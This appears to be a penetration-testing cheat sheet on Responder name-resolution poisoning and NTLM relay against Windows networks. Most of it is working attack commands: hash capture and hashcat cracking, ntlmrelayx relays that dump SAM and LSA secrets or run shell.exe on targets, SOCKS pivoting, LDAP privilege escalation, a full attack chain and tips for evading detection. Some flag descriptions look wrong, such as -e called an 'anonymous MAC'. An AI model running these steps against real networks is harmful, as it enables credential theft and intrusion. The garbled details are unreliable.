# Responder Poisoning Reference

> 来源: HackTricks Responder page, ired.team NTLM relay, Kali docs, Responder GitHub (lgandx)

## Windows Name Resolution Order

```
DNS (UDP/TCP 53) → LLMNR (UDP 5355) → NBT-NS (UDP 137) → mDNS (UDP 5353)
```

- **DNS**: First attempted. If query fails (NXDOMAIN), falls through to LLMNR
- **LLMNR** (Link-Local Multicast Name Resolution): Multicast to 224.0.0.252. Enabled by default on Windows Vista+. Responder poisons this via LLMNR responses
- **NBT-NS** (NetBIOS Name Service): Broadcast/UDP 137. Fallback when LLMNR disabled or fails. Responder poisons via NetBIOS responses
- **mDNS**: Multicast DNS (Bonjour/Apple). UDP 5353. Used by Windows 10+ and macOS clients. Responder can poison mDNS queries

When a user mistypes a share name or a drive mapping fails DNS resolution, Windows broadcasts LLMNR/NBT-NS queries — Responder answers with its own IP, triggering the victim to attempt NTLM authentication, which Responder captures.

## Responder Modes

### Passive: Analyze Mode (`-A`)
```
responder -I eth0 -A
```
- Only listens and logs; does not send any poisoned responses
- Safe for initial enumeration — avoids detection by IDS/EDR
- Captures NBT-NS, LLMNR, and mDNS queries passively
- No hashes captured in this mode (no challenge sent)

### Full Attack Mode (`-wrfP`)
```
responder -I eth0 -wrfP
```
- `-w`: Start WPAD rogue proxy server (HTTP poisoning for proxy autodiscovery)
- `-r`: Enable NetBIOS name resolution request response
- `-f`: Enable NetBIOS fingerprinting
- `-P`: Enable proxy auth NTLM challenge (challenges proxy requests for NTLM auth)
- Alternatively: `responder -I eth0` starts all servers; `-A` and `-wrfP` select attack levels

### Interface Selection
```
responder -I eth0          # Bind to specific interface
responder -I eth0 -e 10.0.0.5  # Specify external IP for poisoned responses
```

## Hash Capture

### Hash Format
NetNTLMv2 hash captured by Responder:
```
administrator::DOMAIN:1122334455667788:ABCDEF1234567890ABCDEF1234567890:0101000000000000...
```

### Crack with hashcat
```
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt --force
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt -r rules/best64.rule
```

- Mode 5600: NetNTLMv2
- Mode 5500: NetNTLMv1 (rare, Windows < NT 4.0 or misconfigured LM compatibility)

### Hash Location
Captured hashes are logged in:
```
/usr/share/responder/logs/SMB-NTLMv2-Client-<IP>.txt
/usr/share/responder/logs/HTTP-NTLMv2-Client-<IP>.txt
/usr/share/responder/logs/LDAP-NTLMv2-Client-<IP>.txt
```

## NTLM Relay

### Check SMB Signing
SMB signing must be **disabled or not required** on the relay target:
```
netexec smb 10.0.0.0/24 --gen-relay-list relay_targets.txt
netexec smb 10.0.0.5 --gen-relay-list  # Single host check
```
Output in relay_targets.txt lists IPs where SMB signing is false.

### ntlmrelayx: SAM Dump
```
impacket-ntlmrelayx -tf relay_targets.txt -smb2support
```
- Waits for incoming NTLM connections (from Responder-poisoned victims)
- Relays to SMB on targets listed in relay_targets.txt
- Dumps SAM hashes from relayed authentication
- Output saved in `/usr/share/impacket/examples/ntlmrelayx/`

### ntlmrelayx: secretsdump
```
impacket-ntlmrelayx -t smb://10.0.0.10 -smb2support
```
- Direct target relay to a single DC or server
- Dumps SAM/SYSTEM/SECURITY/LSA secrets

### ntlmrelayx: Command Execution
```
impacket-ntlmrelayx -tf relay_targets.txt -smb2support -c 'whoami /all'
impacket-ntlmrelayx -tf relay_targets.txt -smb2support -e ./shell.exe
```

### ntlmrelayx: SOCKS Proxy
```
impacket-ntlmrelayx -tf relay_targets.txt -smb2support -socks
```
- Starts SOCKS proxy on localhost:1080
- Each relayed session spawns a SOCKS session — use with proxychains for lateral movement

### Advanced: LDAP Relay
```
impacket-ntlmrelayx -t ldaps://10.0.0.10 --delegate-access --escalate-user attacker
```
- Relays to LDAP(S) to delegate access or escalate privileges
- Requires LDAP signing disabled on DC

## Responder Configuration

### Config File
`/etc/responder/Responder.conf` or `/usr/share/responder/Responder.conf`:
```
[Responder Core]
SQL = On
SMB = On
FTP = On
...
```

Toggle servers on/off to reduce noise. Disable SMB server if already relayed SMB:
```
SMB = Off
HTTP = On
```

### Disable Specific Servers
```
responder -I eth0 -w        # Only WPAD rogue proxy, no SMB/NBT-NS
```

## Detection and Evasion

### IOCs
- ARP spoofing and LLMNR/NBT-NS responses on the wire
- Multiple SMB sessions to a single host with different credentials (relay)
- Event ID 4697 (service installation) on relayed targets
- Responder logs `/usr/share/responder/logs/` — timestamped hash captures

### Evasion
- Lower response rate via Responder.conf `Challenge = 1122334455667788` (static challenge)
- Use anonymous MAC for poisoned responses (`-e` flag)
- Avoid WPAD poisoning (`-rP` without `-w`) in environments with web proxy detection

## Attack Chain Example

```bash
# 1. Start Responder in full attack mode
responder -I eth0 -wrfP &

# 2. Wait for hashes / trigger via coercion techniques
#    (e.g., PetitPotam, PrinterBug, lnk files, responder's MultiRelay)

# 3. Simultaneously, enumerate relay targets
netexec smb 10.0.0.0/24 --gen-relay-list relay_targets.txt

# 4. If SMB signing disabled on DC — relay to dump NTDS
impacket-ntlmrelayx -t smb://10.0.0.10 -smb2support -of ntlmrelayx_dump.txt

# 5. Crack captured hashes offline
hashcat -m 5600 SMB-NTLMv2-hash.txt rockyou.txt

# 6. Use cracked creds for further enumeration (BloodHound, secretsdump)
```

## 参考来源

- HackTricks: "Responder" — https://hacktricks.wiki/en/generic-methodologies-and-resources/pentesting-network/responder-and-ntlm-relay
- ired.team: "NTLM Relay" — https://www.ired.team/offensive-security/credential-access-and-credential-dumping/ntlm-relay
- Kali docs: Responder — https://www.kali.org/tools/responder/
- Responder GitHub: https://github.com/lgandx/Responder
- Impacket: ntlmrelayx — https://github.com/fortra/impacket
